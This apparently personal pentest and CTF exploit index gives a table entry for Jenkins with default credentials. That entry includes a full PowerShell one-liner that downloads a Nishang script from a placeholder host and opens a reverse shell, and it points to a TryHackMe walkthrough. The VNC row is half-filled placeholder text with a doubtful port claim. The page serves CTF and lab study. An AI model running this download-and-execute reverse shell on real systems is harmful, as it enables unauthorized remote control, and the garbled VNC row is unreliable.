## Pentest make easy

The purspose of this site is to make the Penetration testing and Privilege escation make easy. There are several exploits and various writeup avilable. But when it is needed its very difficult to find out the exact exploit and the writeup.

In this site I am attempting to collect most of the common exploits that appear in CTF and other exinvornments.


### Random Exploit collection

Here I am collectign some of the random exploits and their exploitation technqiues. Later I will categorised and group them to each group.

| Application Name | Vulnerability | Scenario | Working Exploits | Reverse Shell | Writeup and Reference |

| Jenkins  | default username and pass |Running in Windows | Nishang to gain initial access. | Find a feature of the tool that allows you to execute commands on the underlying system. When you find this feature, you can use this command to get the reverse shell on your machine and then run it: powershell iex (New-Object Net.WebClient).DownloadString('http://your-ip:your-port/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress your-ip -Port your-port|https://executeatwill.com/2020/04/01/TryHackMe-Alfred-Walkthrough/|
| VNC  | Content Cell  |running in port 3389 and can be exploited using password lookup|
